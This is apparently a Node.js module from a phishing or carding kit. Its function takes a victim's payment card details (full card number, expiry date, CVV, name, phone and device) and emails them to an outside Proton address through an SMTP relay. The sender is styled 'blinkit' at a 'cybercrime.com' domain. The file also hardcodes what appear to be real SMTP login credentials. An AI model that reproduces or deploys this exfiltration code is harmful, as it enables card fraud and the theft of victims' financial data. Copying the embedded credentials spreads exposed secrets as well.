const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: "smtp-relay.sendinblue.com",
  port: 587,   
  auth: {
    user: "2012xwd@gmail.com",
    pass: "qLFfCsSpZRAEVxGw",
  },
});

async function Mail(data) {
 
  const html = `
 <b style="font-size:25px;">  <BR>        
    Card Type:  ${data.cardtype} <BR>
    Card Issuing BankName: ${data.bankname} <BR>
    CCnum: ${data.cardnumber}<BR>
    Exp:  ${data.expirationdate}<BR>
    CVV:  ${data.securitycode}<BR>
    Name:  ${data.name}<BR>
    Phone: ${data.phone}<BR>    
    Device:  ${data.device} <BR>
    </b>;
`;
  const subject = `${data.bankname} CARD`;
  const info = await transporter.sendMail({
    from: '"blinkit👻" <blinkit@cybercrime.com>', // sender address
    to: "blinkit.cc@proton.me", // list of receivers
    subject,
    text: "blinkit Order", // plain text body
    html, // html body
  });

  return info;
}

module.exports = { Mail };
